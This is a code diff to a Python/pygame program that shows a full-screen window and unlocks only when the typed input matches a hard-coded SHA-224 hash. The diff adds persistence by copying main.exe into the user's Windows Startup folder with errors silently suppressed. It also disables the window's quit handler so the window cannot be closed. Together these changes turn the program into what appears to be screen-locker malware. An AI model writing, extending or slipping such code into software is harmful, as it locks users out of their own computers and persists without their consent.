@@ -2,7 +2,8 @@ import hashlib
 import sys
 import pygame
 import os
-
+import getpass
+import shutil
 import win32con
 import win32gui
 
@@ -18,7 +19,22 @@ def check_input(input_text):
     return sha224.hexdigest() == '9f17cd624f25b28374a58a6c107d3d0df4299ddccfe390eeba373d12'
 
 
+def create_autorun():
+    username = getpass.getuser()
+    filename = 'main.exe'
+    dir_name = f'C:/Users/{username}/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/'
+    try:
+        shutil.copy(filename, dir_name)
+    except:
+        try:
+            filename = 'dist/' + filename
+            shutil.copy(filename, dir_name)
+        except:
+            pass
+
+
 def main():
+    create_autorun()
     pygame.init()
     pygame.font.init()
     size = width, height = 1920, 1080
@@ -44,8 +60,8 @@ def main():
 
         for event in pygame.event.get():
             if event.type == pygame.QUIT:
-                # pass
-                end = True
+                pass
+                # end = True
             if event.type == pygame.KEYDOWN:
                 if event.key == pygame.K_BACKSPACE:
                     input_text = input_text[:-1]
